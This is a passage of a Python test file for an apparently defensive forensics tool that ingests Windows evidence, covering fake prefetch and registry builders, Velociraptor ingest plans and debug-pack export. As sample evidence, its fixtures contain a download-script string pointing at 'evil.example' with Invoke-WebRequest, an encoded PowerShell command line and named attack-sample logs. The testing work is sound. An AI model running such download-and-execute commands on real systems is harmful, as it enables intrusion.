    last_run = last_run or datetime(2026, 5, 3, 10, 0, tzinfo=UTC)
    previous_run = previous_run or datetime(2026, 5, 2, 9, 30, tzinfo=UTC)
    blob = bytearray(b"\x00" * 1024)
    struct.pack_into("<I", blob, 0, version)
    blob[4:8] = b"SCCA"
    name_bytes = executable_name.encode("utf-16le")
    blob[16:16 + min(len(name_bytes), 58)] = name_bytes[:58]
    info_offset = 84
    volumes_info_offset = 240
    filename_strings_offset = 420
    filename_strings = (executable_path + "\x00" + referenced_extra + "\x00").encode("utf-16le")
    struct.pack_into("<I", blob, info_offset + 16, filename_strings_offset)
    struct.pack_into("<I", blob, info_offset + 20, len(filename_strings))
    struct.pack_into("<I", blob, info_offset + 24, volumes_info_offset)
    struct.pack_into("<I", blob, info_offset + 28, 1)
    if version == 17:
        blob[info_offset + 36: info_offset + 44] = _filetime_bytes(last_run)
        struct.pack_into("<I", blob, info_offset + 60, run_count)
    elif version == 23:
        blob[info_offset + 44: info_offset + 52] = _filetime_bytes(last_run)
        struct.pack_into("<I", blob, info_offset + 68, run_count)
    else:
        blob[info_offset + 44: info_offset + 52] = _filetime_bytes(last_run)
        blob[info_offset + 52: info_offset + 60] = _filetime_bytes(previous_run)
        struct.pack_into("<I", blob, info_offset + 116, run_count)
    entry_offset = volumes_info_offset
    device_path_offset = 104
    dir_strings_offset = 140
    struct.pack_into("<I", blob, entry_offset + 0, device_path_offset)
    struct.pack_into("<I", blob, entry_offset + 4, len(volume_device_path))
    blob[entry_offset + 8: entry_offset + 16] = _filetime_bytes(datetime(2024, 1, 1, tzinfo=UTC))
    struct.pack_into("<I", blob, entry_offset + 16, volume_serial)
    struct.pack_into("<I", blob, entry_offset + 28, dir_strings_offset)
    struct.pack_into("<I", blob, entry_offset + 32, 1)
    device_path_bytes = volume_device_path.encode("utf-16le")
    blob[volumes_info_offset + device_path_offset: volumes_info_offset + device_path_offset + len(device_path_bytes)] = device_path_bytes
    directory = str(Path(executable_path.replace("\\", "/")).parent).replace("/", "\\")
    directory_bytes = directory.encode("utf-16le")
    struct.pack_into("<H", blob, volumes_info_offset + dir_strings_offset, len(directory))
    start = volumes_info_offset + dir_strings_offset + 2
    blob[start:start + len(directory_bytes)] = directory_bytes
    blob[start + len(directory_bytes): start + len(directory_bytes) + 2] = b"\x00\x00"
    blob[filename_strings_offset: filename_strings_offset + len(filename_strings)] = filename_strings
    struct.pack_into("<I", blob, 12, len(blob))
    return bytes(blob)


def _build_fake_mam_prefetch_bytes() -> bytes:
    return b"MAM\x04" + (b"\x00" * 124)


def _build_fake_mam_container(compressed_payload: bytes, *, uncompressed_size: int) -> bytes:
    import struct

    return b"MAM\x84" + struct.pack("<I", uncompressed_size) + b"\x00\x00\x00\x00" + struct.pack("<I", len(compressed_payload)) + compressed_payload


def _build_minimal_shimcache_win10_bytes(*, path: str, last_modified: datetime | None = None) -> bytes:
    import struct

    last_modified = last_modified or datetime(2026, 5, 3, 10, 0, tzinfo=UTC)
    encoded_path = path.encode("utf-16le")
    unix_epoch = datetime(1601, 1, 1, tzinfo=UTC)
    filetime = int((last_modified - unix_epoch).total_seconds() * 10_000_000)
    low = filetime & 0xFFFFFFFF
    high = (filetime >> 32) & 0xFFFFFFFF
    entry = struct.pack("<H", len(encoded_path)) + encoded_path + struct.pack("<LL", low, high)
    return (b"\x00" * 0x30) + struct.pack("<4sLL", b"10ts", 0, len(entry)) + entry


class _FakeRegistryValue:
    def __init__(self, name: str, value: object):
        self._name = name
        self._value = value

    def name(self) -> str:
        return self._name

    def value(self) -> object:
        return self._value


class _FakeRegistryKey:
    def __init__(self, path: str, *, values: dict[str, object] | None = None, timestamp: datetime | None = None, subkeys: list["_FakeRegistryKey"] | None = None):
        self._path = path
        self._values = values or {}
        self._timestamp = timestamp
        self._subkeys = subkeys or []

    def path(self) -> str:
        return self._path

    def name(self) -> str:
        return self._path.split("\\")[-1]

    def values(self) -> list[_FakeRegistryValue]:
        return [_FakeRegistryValue(name, value) for name, value in self._values.items()]

    def subkeys(self) -> list["_FakeRegistryKey"]:
        return list(self._subkeys)

    def timestamp(self) -> datetime | None:
        return self._timestamp


class _FakeRegistryModule:
    class RegistryKeyNotFoundException(Exception):
        pass

    class Registry:
        def __init__(self, _: str, keys: dict[str, _FakeRegistryKey] | None = None):
            self._keys = keys or {}

        def open(self, path: str) -> _FakeRegistryKey:
            key = self._keys.get(path)
            if not key:
                raise _FakeRegistryModule.RegistryKeyNotFoundException(path)
            return key

        def root(self) -> _FakeRegistryKey:
            root_subkeys = [key for key in self._keys.values() if "\\" not in key.path()]
            return _FakeRegistryKey("ROOT", subkeys=root_subkeys)


def test_load_rules_missing_file_returns_empty() -> None:
    assert load_yaml_rule_file("missing-file.yaml") == {}


def test_load_suspicious_keywords_safe_shape() -> None:
    data = load_suspicious_keywords()
    assert "process_names" in data
    assert "event_ids" in data


def test_detect_velociraptor_type(tmp_path: Path) -> None:
    sample = tmp_path / "sample.zip"
    sample.write_bytes(b"fake")
    detected = detect_evidence_type(sample, ["results/Windows.Triage.Targets%2FPsList_From_Pslist.csv", "uploads/file.bin"])
    assert detected.value == "velociraptor_zip"


def test_velociraptor_reprocess_without_selection_returns_waiting_selection() -> None:
    item = SimpleNamespace(evidence_type=EvidenceType.velociraptor_zip)
    metadata, should_enqueue = _prepare_reprocess_state(
        item,
        {
            "velociraptor_discovery": {
                "candidates": [
                    {
                        "id": "browser-1",
                        "category": "browser",
                        "original_path": "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History",
                        "companion_files": [],
                    }
                ]
            },
            "total_zip_entries": 100,
            "ignored_entries": 10,
            "candidate_files": 1,
        },
    )
    assert should_enqueue is True
    assert metadata["current_phase"] == "uploaded"
    assert metadata["progress_pct"] == 0
    assert metadata["velociraptor_selected_candidate_ids"] == ["browser-1"]
    assert metadata["selected_candidates"] == 1
    assert metadata["selected_files_total"] is None


def test_velociraptor_reprocess_with_selection_resets_to_waiting_selection() -> None:
    item = SimpleNamespace(evidence_type=EvidenceType.velociraptor_zip)
    metadata, should_enqueue = _prepare_reprocess_state(
        item,
        {
            "velociraptor_discovery": {
                "candidates": [
                    {
                        "id": "browser-1",
                        "category": "browser",
                        "original_path": "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History",
                        "companion_files": [
                            "uploads/auto/C%3A/Users/alex/AppData/Local/Google/Chrome/User Data/Default/History-wal"
                        ],
                    }
                ]
            },
            "velociraptor_selected_candidate_ids": ["browser-1"],
            "velociraptor_selected_categories": ["browser"],
        },
    )
    assert should_enqueue is True
    assert metadata["current_phase"] == "uploaded"
    assert metadata["progress_pct"] == 0
    assert metadata["selected_candidates"] == 1
    assert metadata["selected_files_total"] is None
    assert metadata["velociraptor_selected_candidate_ids"] == ["browser-1"]


def test_ingest_plan_previous_selection_preview_excludes_new_candidates() -> None:
    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        stored_path="/tmp/raw.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        storage_mode=None,
    )
    previous_metadata = {
        "source_type": "raw_collection",
        "velociraptor_discovery": {
            "candidates": [
                {
                    "id": "evtx-1",
                    "category": "evtx",
                    "artifact_type": "windows_event",
                    "parser": "evtx_raw",
                    "supported": True,
                    "original_path": "Windows/System32/winevt/Logs/Security.evtx",
                    "size": 10,
                    "mtime": "2026-05-21T10:00:00Z",
                    "warnings": [],
                }
            ]
        },
    }
    previous_metadata = persist_plan(
        previous_metadata,
        build_plan(
            evidence,
            previous_metadata,
            discovery_mode="manual",
            selected_candidate_ids=["evtx-1"],
            disabled_candidate_ids=[],
        ),
    )
    current_metadata = {
        "source_type": "raw_collection",
        "velociraptor_discovery": {
            "candidates": [
                previous_metadata["velociraptor_discovery"]["candidates"][0],
                {
                    "id": "browser-1",
                    "category": "browser",
                    "artifact_type": "browser",
                    "parser": "sqlite_chromium",
                    "supported": True,
                    "original_path": "Users/alex/AppData/Local/Google/Chrome/User Data/Default/History",
                    "size": 20,
                    "mtime": "2026-05-21T10:01:00Z",
                    "warnings": [],
                },
            ]
        },
    }
    preview = build_reprocess_preview(evidence, metadata=previous_metadata, current_metadata=current_metadata, mode="previous_selection")
    assert [item["candidate_id"] for item in preview["selected_candidates"]] == ["evtx-1"]
    assert [item["candidate_id"] for item in preview["new_candidates"]] == ["browser-1"]
    assert preview["summary"]["new_candidates"] == 1


def test_ingest_plan_choose_again_preview_keeps_previous_selection_preselected() -> None:
    evidence = SimpleNamespace(
        id="evidence-1",
        case_id="case-1",
        stored_path="/tmp/raw.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        storage_mode=None,
    )
    metadata = {
        "source_type": "raw_collection",
        "velociraptor_discovery": {
            "candidates": [
                {
                    "id": "evtx-1",
                    "category": "evtx",
                    "artifact_type": "windows_event",
                    "parser": "evtx_raw",
                    "supported": True,
                    "original_path": "Windows/System32/winevt/Logs/Security.evtx",
                    "size": 10,
                    "mtime": "2026-05-21T10:00:00Z",
                    "warnings": [],
                }
            ]
        },
    }
    metadata = persist_plan(
        metadata,
        build_plan(
            evidence,
            metadata,
            discovery_mode="manual",
            selected_candidate_ids=["evtx-1"],
            disabled_candidate_ids=[],
        ),
    )
    current_metadata = {
        "source_type": "raw_collection",
        "velociraptor_discovery": {
            "candidates": [
                metadata["velociraptor_discovery"]["candidates"][0],
                {
                    "id": "browser-1",
                    "category": "browser",
                    "artifact_type": "browser",
                    "parser": "sqlite_chromium",
                    "supported": True,
                    "original_path": "Users/alex/AppData/Local/Google/Chrome/User Data/Default/History",
                    "size": 20,
                    "mtime": "2026-05-21T10:01:00Z",
                    "warnings": [],
                },
            ]
        },
    }
    preview = build_reprocess_preview(evidence, metadata=metadata, current_metadata=current_metadata, mode="choose_again")
    assert sorted(item["candidate_id"] for item in preview["selected_candidates"]) == ["evtx-1"]
    assert sorted(item["candidate_id"] for item in preview["new_candidates"]) == ["browser-1"]
    assert preview["summary"]["new_candidates"] == 1


def test_reprocess_mode_defaults_to_previous_selection_when_plan_exists() -> None:
    assert _normalize_reprocess_mode(None, has_previous_plan=True) == "previous_selection"
    assert _normalize_reprocess_mode("", has_previous_plan=True) == "previous_selection"
    assert _normalize_reprocess_mode("updated_discovery", has_previous_plan=True) == "choose_again"
    assert _normalize_reprocess_mode("manual", has_previous_plan=True) == "manual_selection"


def test_rebuild_ingest_plan_from_last_run_uses_real_artifacts() -> None:
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    Session = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False, future=True)
    db = Session()
    case_id = "11111111-1111-4111-8111-aaaaaaaaaaaa"
    evidence_id = "22222222-2222-4222-8222-bbbbbbbbbbbb"
    case = Case(id=case_id, name="Case 1", status=CaseStatus.open)
    evidence = Evidence(
        id=evidence_id,
        case_id=case_id,
        original_filename="collection.7z",
        stored_path="/tmp/collection.7z",
        original_path="/tmp/collection.7z",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="abc",
        size_bytes=123,
        file_count=8,
        ingest_status=IngestStatus.completed,
        storage_mode="uploaded",
        metadata_json={
            "source_type": "raw_collection",
            "velociraptor_discovery": {
                "candidates": [
                    {
                        "id": "evtx-1",
                        "category": "evtx",
                        "artifact_type": "evtx_raw",
                        "parser": "evtx_raw",
                        "supported": True,
                        "original_path": "Uploads/Windows/System.evtx",
                        "size": 10,
                        "mtime": "2026-05-21T10:00:00Z",
                        "warnings": [],
                    },
                    {
                        "id": "evtx-2",
                        "category": "evtx",
                        "artifact_type": "evtx_raw",
                        "parser": "evtx_raw",
                        "supported": True,
                        "original_path": "Uploads/Windows/Security.evtx",
                        "size": 11,
                        "mtime": "2026-05-21T10:00:01Z",
                        "warnings": [],
                    },
                    {
                        "id": "jsonl-1",
                        "category": "browser",
                        "artifact_type": "browser",
                        "parser": "sqlite_chromium",
                        "supported": True,
                        "original_path": "Uploads/Users/alex/History",
                        "size": 12,
                        "mtime": "2026-05-21T10:00:02Z",
                        "warnings": [],
                    },
                    {
                        "id": "other-1",
                        "category": "other",
                        "artifact_type": "text_raw",
                        "parser": "text_raw",
                        "supported": False,
                        "original_path": "Uploads/readme.txt",
                        "size": 13,
                        "mtime": "2026-05-21T10:00:03Z",
                        "warnings": [],
                    },
                ]
            },
        },
        error_log={},
        path_validation={},
        ingest_source={},
    )
    db.add(case)
    db.add(evidence)
    db.add_all(
            [
                Artifact(id="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaa1", case_id=case_id, evidence_id=evidence_id, name="System.evtx", artifact_type="evtx_raw", source_path="Uploads/Windows/System.evtx", parser="evtx_raw", record_count=100, status="completed"),
                Artifact(id="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbb2", case_id=case_id, evidence_id=evidence_id, name="Security.evtx", artifact_type="evtx_raw", source_path="Uploads/Windows/Security.evtx", parser="evtx_raw", record_count=120, status="completed"),
                Artifact(id="cccccccc-cccc-4ccc-8ccc-ccccccccccc3", case_id=case_id, evidence_id=evidence_id, name="History", artifact_type="browser", source_path="Uploads/Users/alex/History", parser="sqlite_chromium", record_count=30, status="completed"),
            ]
        )
    db.commit()
    plan = rebuild_ingest_plan_from_last_run(db, evidence, evidence.metadata_json or {}, persist=False)
    assert plan is not None
    assert plan["plan_source"] == "reconstructed_from_last_ingest"
    assert len(plan["selected_candidates"]) == 3
    assert plan["selected_by_artifact_type"]["evtx_raw"] == 2
    assert plan["selected_by_parser"]["evtx_raw"] == 2
    assert sorted(item["candidate_id"] for item in plan["selected_candidates"]) == ["evtx-1", "evtx-2", "jsonl-1"]
    preview = build_reprocess_preview(evidence, metadata={"source_type": "raw_collection", "ingest_plan": plan}, current_metadata=evidence.metadata_json or {}, mode="previous_selection")
    assert preview["summary"]["selected_by_artifact_type"]["evtx_raw"] == 2
    assert len(preview["selected_candidates"]) == 3


def test_evidence_detail_reprocess_copy_mentions_previous_selection() -> None:
    evidence_detail_path = Path(__file__).resolve().parents[2] / "frontend" / "src" / "pages" / "EvidenceDetail.tsx"
    if not evidence_detail_path.exists():
        pytest.skip("frontend sources are not present in this test environment")
    evidence_detail = evidence_detail_path.read_text(encoding="utf-8")
    assert "Use previous parser selection" in evidence_detail
    assert "Choose artifacts again" in evidence_detail
    assert "Start from scratch / Full rediscovery" in evidence_detail
    assert "Type REDISCOVER" in evidence_detail


def test_select_artifacts_uses_velociraptor_discovery_for_velociraptor_zip(monkeypatch, tmp_path: Path) -> None:
    called = {"velociraptor": 0, "generic": 0}

    def fake_velociraptor(root: Path, selected_candidates=None, progress_cb=None):
        called["velociraptor"] += 1
        return [{"name": "System.evtx", "artifact_type": "windows_event", "parser": "evtx_raw"}]

    def fake_generic(root: Path):
        called["generic"] += 1
        return [{"name": "sq.json", "artifact_type": "generic_json", "parser": "generic_json"}]

    monkeypatch.setattr("app.workers.tasks.list_velociraptor_artifacts", fake_velociraptor)
    monkeypatch.setattr("app.workers.tasks.list_generic_artifacts", fake_generic)

    item = SimpleNamespace(evidence_type=EvidenceType.velociraptor_zip, metadata_json={})
    artifacts = _select_artifacts(item, tmp_path)

    assert called["velociraptor"] == 1
    assert called["generic"] == 0
    assert artifacts[0]["parser"] == "evtx_raw"


def test_select_artifacts_uses_single_evtx_ingest_plan_candidate(tmp_path: Path) -> None:
    extracted_dir = tmp_path / "extracted"
    extracted_dir.mkdir()
    evtx_path = extracted_dir / "sample.evtx"
    evtx_path.write_bytes(b"ElfFile\x00sample")

    item = SimpleNamespace(
        evidence_type=EvidenceType.evtx,
        metadata_json={
            "ingest_plan": {
                "selected_candidates": [
                    {
                        "relative_path": "sample.evtx",
                        "source_path": "sample.evtx",
                        "display_name": "sample.evtx",
                        "artifact_type": "windows_event",
                        "parser": "evtx_raw",
                        "category": "evtx",
                        "reason": "single_evtx_file_detected",
                    }
                ]
            }
        },
    )

    artifacts = _select_artifacts(item, extracted_dir)

    assert len(artifacts) == 1
    assert artifacts[0]["artifact_type"] == "windows_event"
    assert artifacts[0]["parser"] == "evtx_raw"
    assert artifacts[0]["source_path"] == "sample.evtx"
    assert artifacts[0]["path"] == evtx_path


def test_raw_collection_entry_detection_matches_disk_copy_layout() -> None:
    assert _looks_like_raw_collection_entries(
        [
            "Windows/System32/wbem/Repository/OBJECTS.DATA",
            "Users/alex/AppData/Local/Google/Chrome/User Data/Default/History",
        ]
    )


def test_raw_collection_autoroute_detects_folder_like_disk_copy(tmp_path: Path) -> None:
    root = tmp_path / "disk-copy"
    root.mkdir()
    assert _should_route_to_raw_collection_discovery(
        root,
        [
            "Windows/System32/config/SYSTEM",
            "Users/alex/NTUSER.DAT",
        ],
    )


def test_raw_collection_autoroute_does_not_flag_parsed_folder(tmp_path: Path) -> None:
    root = tmp_path / "parsed-output"
    root.mkdir()
    assert not _should_route_to_raw_collection_discovery(
        root,
        [
            "RECmd_Output.csv",
            "MFTECmd_Output.csv",
            "EvtxECmd_Output.csv",
        ],
    )


def test_raw_collection_autoroute_detects_evtx_heavy_archive_entries(tmp_path: Path) -> None:
    archive = tmp_path / "evtx-heavy.zip"
    archive.write_bytes(b"PK\x03\x04")
    assert _should_route_to_raw_collection_discovery(
        archive,
        [
            "__MACOSX/Logs/._Security.evtx",
            "EVTX-ATTACK-SAMPLES/Command and Control/bits_openvpn.evtx",
            "EVTX-ATTACK-SAMPLES/Credential Access/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
            "EVTX-ATTACK-SAMPLES/Privilege Escalation/UACME_59_Sysmon.evtx",
        ],
    )


def test_detect_future_evidence_types(tmp_path: Path) -> None:
    evtx = tmp_path / "security.evtx"
    evtx.write_text("", encoding="utf-8")
    mem = tmp_path / "memory.raw"
    mem.write_text("", encoding="utf-8")
    pcap = tmp_path / "capture.pcapng"


class _FakeQuery:
    def __init__(self, items: list[object]) -> None:
        self.items = items

    def filter(self, *args, **kwargs):  # noqa: ANN002, ANN003
        return self

    def order_by(self, *args, **kwargs):  # noqa: ANN002, ANN003
        return self

    def all(self):
        return list(self.items)

    def first(self):
        return self.items[0] if self.items else None

    def limit(self, value: int):  # noqa: ARG002
        return self

    def count(self):
        return len(self.items)


class _FakeSession:
    def __init__(self, case: Case, evidences: list[Evidence]) -> None:
        self._case = case
        self._evidences = evidences

    def get(self, model, identifier):  # noqa: ANN001
        if model is Case and identifier == self._case.id:
            return self._case
        return None

    def query(self, model):  # noqa: ANN001
        if model is Evidence:
            return _FakeQuery(self._evidences)
        return _FakeQuery([])


class _CorrelationSession(_FakeSession):
    def __init__(self, case: Case, evidences: list[Evidence], findings: list[Finding] | None = None) -> None:
        super().__init__(case, evidences)
        self._findings = findings or []

    def query(self, model):  # noqa: ANN001
        if model is Finding:
            return _FakeQuery(self._findings)
        return super().query(model)

    def add(self, item):  # noqa: ANN001
        if isinstance(item, Finding):
            if not getattr(item, "id", None):
                item.id = f"finding-{len(self._findings) + 1}"
            self._findings.append(item)

    def commit(self) -> None:
        return None

    def refresh(self, item) -> None:  # noqa: ANN001
        return None


def test_debug_export_sanitize_redacts_and_truncates() -> None:
    request = DebugExportRequest(max_field_length=200, redact_secrets=True)
    event = {
        "id": "evt-1",
        "artifact": {"type": "network", "parser": "wlan_profile_xml"},
        "event": {"type": "wlan_profile"},
        "source_file": "wifi.xml",
        "raw_summary": "Provider: WLAN",
        "search_text": "A" * 300,
        "wlan": {"keyMaterial": "super-secret-password"},
        "raw": {"Authorization": "Bearer abcdefghijklmnop"},
    }
    sanitized = _sanitize_event(event, request)
    assert sanitized["search_text_preview"].endswith("[TRUNCATED]")
    assert sanitized["wlan"]["keyMaterial"] == "[REDACTED]"
    assert "raw" not in sanitized


def test_search_text_huge_string_is_truncated() -> None:
    document = {
        "id": "evt-1",
        "event_id": "evt-1",
        "search_text": "A" * (SEARCH_TEXT_MAX_CHARS + 5000),
        "data_quality": [],
    }
    sanitized = sanitize_document_for_index(document)
    assert len(sanitized["search_text"]) <= SEARCH_TEXT_MAX_CHARS
    assert "search_text_truncated" in sanitized["data_quality"]


def test_search_text_utf16_nulls_are_sanitized() -> None:
    document = {
        "id": "evt-1",
        "event_id": "evt-1",
        "search_text": "T\x00h\x00r\x00e\x00a\x00t\x00 \x00N\x00a\x00m\x00e\x00",
        "data_quality": [],
    }
    sanitized = sanitize_document_for_index(document)
    assert "\x00" not in sanitized["search_text"]
    assert "Threat Name" in sanitized["search_text"]
    assert "search_text_removed_control_chars" in sanitized["data_quality"]


def test_search_text_keeps_useful_browser_and_powershell_tokens() -> None:
    document = {
        "id": "evt-1",
        "event_id": "evt-1",
        "search_text": "https://evil.example/a.ps1 powershell.exe Invoke-WebRequest",
        "data_quality": [],
    }
    sanitized = sanitize_document_for_index(document)
    assert "evil.example" in sanitized["search_text"]
    assert "powershell.exe" in sanitized["search_text"]
    assert "Invoke-WebRequest" in sanitized["search_text"]


def test_generate_debug_pack_contains_required_files(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")

    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [{
        "id": "evt-1",
        "event_id": "evt-1",
        "case_id": "case-1",
        "evidence_id": "evidence-1",
        "source_file": "Security.evtx",
        "@timestamp": "2026-05-12T12:00:00Z",
        "artifact": {"type": "windows_event", "parser": "evtx_raw"},
        "event": {"category": "authentication", "type": "logon_success", "timeline_include": True, "severity": "info"},
        "windows": {"event_id": 4624, "channel": "Security", "provider": "Microsoft-Windows-Security-Auditing"},
        "raw_summary": "Provider: Security",
        "search_text": "Security 4624",
    }])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])

    zip_bytes, filename = generate_debug_pack(session, "case-1", request)
    assert filename.startswith("debug_pack_")
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    names = set(archive.namelist())
    assert "manifest.json" in names
    assert "debug_export_scope_report.json" in names
    assert "ingest_summary.json" in names
    assert "ingest_performance_report.json" in names
    assert "problematic_artifacts_report.json" in names
    assert "long_tail_artifacts_report.json" in names
    assert "evtx_health_report.json" in names
    assert "discovery_candidates.json" in names
    assert "parser_audit.json" in names
    assert "process_graph.json" in names
    assert "process_tree_report.json" in names
    assert "process_tree_sample_chains.jsonl" in names
    assert "correlation_findings_report.json" in names
    assert "correlation_findings.jsonl" in names
    assert "correlation_sample_findings.jsonl" in names
    assert "normalized_events_sample.jsonl" in names
    assert "lnk_parse_report.json" in names
    assert "email_parse_report.json" in names
    assert "email_sample_events.jsonl" in names
    assert "rules_matches.jsonl" in names
    assert "field_coverage_report.json" in names
    assert "data_quality_report.json" in names
    assert "dedup_report.json" in names
    assert "README_DEBUG_PACK.md" in names


def test_generate_debug_pack_process_graph_artifacts(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [
        {
            "id": "evt-a",
            "event_id": "evt-a",
            "case_id": "case-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:00:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start", "timeline_include": True},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "A", "pid": 100, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe"},
            "search_text": "explorer",
            "raw_summary": "explorer",
        },
        {
            "id": "evt-b",
            "event_id": "evt-b",
            "case_id": "case-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:01:00Z",
            "artifact": {"type": "process", "parser": "sysmon_evtx"},
            "event": {"type": "process_start", "timeline_include": True},
            "host": {"name": "desktop-1"},
            "user": {"name": "dfir"},
            "process": {"entity_id": "B", "parent_entity_id": "A", "pid": 200, "name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -enc AAAA", "parent_name": "explorer.exe"},
            "search_text": "powershell",
            "raw_summary": "powershell",
        },
    ])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    graph = json.loads(archive.read("process_graph.json").decode("utf-8"))
    report = json.loads(archive.read("process_tree_report.json").decode("utf-8"))
    chains = archive.read("process_tree_sample_chains.jsonl").decode("utf-8").strip().splitlines()
    assert graph["summary"]["nodes_count"] == 2
    assert graph["summary"]["edges_count"] == 1
    assert report["nodes_count"] == 2
    assert chains


def test_generate_debug_pack_includes_correlation_findings(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )

    class _FindingSession(_FakeSession):
        def __init__(self, case: Case, evidences: list[Evidence]) -> None:
            super().__init__(case, evidences)
            item = Finding(case_id="case-1", evidence_id="evidence-1", title="Correlated payload", description="Payload was downloaded and executed", severity=FindingSeverity.high, status=FindingStatus.new, source="correlation_engine", finding_type="download_execute_detect", confidence="high", related_event_ids=["evt-1"], timeline=[{"event_id": "evt-1"}])
            item.id = "finding-1"
            self._findings = [item]

        def query(self, model):  # noqa: ANN001
            if model is Finding:
                return _FakeQuery(self._findings)
            return super().query(model)

    session = _FindingSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
    monkeypatch.setattr("app.services.debug_export._load_manifests", lambda context: {"evidence-1": {"artifacts": [], "stats": {}, "files": []}})
    monkeypatch.setattr("app.services.debug_export._collect_discovery_candidates", lambda context: [])
    monkeypatch.setattr("app.services.debug_export._collect_indexing_errors", lambda context, manifests: [])
    zip_bytes, _ = generate_debug_pack(session, "case-1", request)
    archive = zipfile.ZipFile(io.BytesIO(zip_bytes))
    report = json.loads(archive.read("correlation_findings_report.json").decode("utf-8"))
    findings = [json.loads(line) for line in archive.read("correlation_findings.jsonl").decode("utf-8").splitlines() if line.strip()]
    assert report["findings_generated"] == 1
    assert report["by_type"]["download_execute_detect"] == 1
    assert findings[0]["finding_type"] == "download_execute_detect"


def test_generate_debug_pack_includes_noise_reduction_report(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path=str(tmp_path / "sample.zip"),
        evidence_type=EvidenceType.parsed_folder,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={},
        error_log={},
    )
    session = _FakeSession(case, [evidence])
    request = DebugExportRequest(scope="evidence", evidence_id="evidence-1")
    adjusted_event = {
        "id": "evt-1",
        "event_id": "evt-1",
        "@timestamp": "2026-05-15T10:00:00+00:00",
        "artifact": {"type": "autorun", "parser": "registry_run_key"},
        "event": {
            "type": "autorun",
            "message": "Autorun entry observed",
            "risk_adjustment": {
                "base_score": 70,
                "final_score": 20,
                "positive_reasons": [],
                "negative_reasons": ["Microsoft signed and verified in known-good Windows path"],
                "suppressed": False,
                "suppression_reason": None,
            },
        },
        "tags": ["benign_microsoft_signed", "known_good_windows_path"],
        "risk_score": 20,
    }
    monkeypatch.setattr("app.services.debug_export._fetch_events_for_scope", lambda context: [adjusted_event])
    monkeypatch.setattr("app.services.debug_export._collect_rules_matches", lambda db, context: [])
    monkeypatch.setattr("app.services.debug_export._collect_semiauto_analysis", lambda db, context: {"sections": {}, "counts": {}, "activities": []})
